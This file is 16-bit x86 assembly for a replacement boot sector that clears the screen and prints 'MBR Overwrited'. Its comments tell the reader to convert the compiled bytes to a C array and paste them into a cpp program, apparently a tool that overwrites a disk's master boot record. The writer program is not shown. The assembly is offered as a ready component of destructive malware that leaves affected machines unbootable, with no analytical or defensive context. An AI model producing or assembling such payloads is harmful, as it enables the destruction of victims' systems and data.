; You will have to open this file in HxD
; and get the hex by clicking on Copy->as C
; After doint that paste the code into the
; variable in the cpp file.


BITS    16
ORG     0x7c00
jmp start

start:
        call cls
        mov ax,cs
        mov ds,ax
        mov si,message

        call print

print:
        push ax
        cld
next:
        mov al,[si]
        cmp al,0
        je done
        call printtext
        inc si
        jmp next
done:
        jmp $

printtext:
        mov ah,0x0e
        int 0x10
        ret

cls:
        mov ah, 0x07
        mov al, 0x00
        mov bh, 0x09 
        mov cx, 0x0000 
        mov dx, 0x184f
        int 0x10
        ret

message:            db        "MBR Overwrited", 0
times 510 - ($-$$) db 0
dw        0xaa55
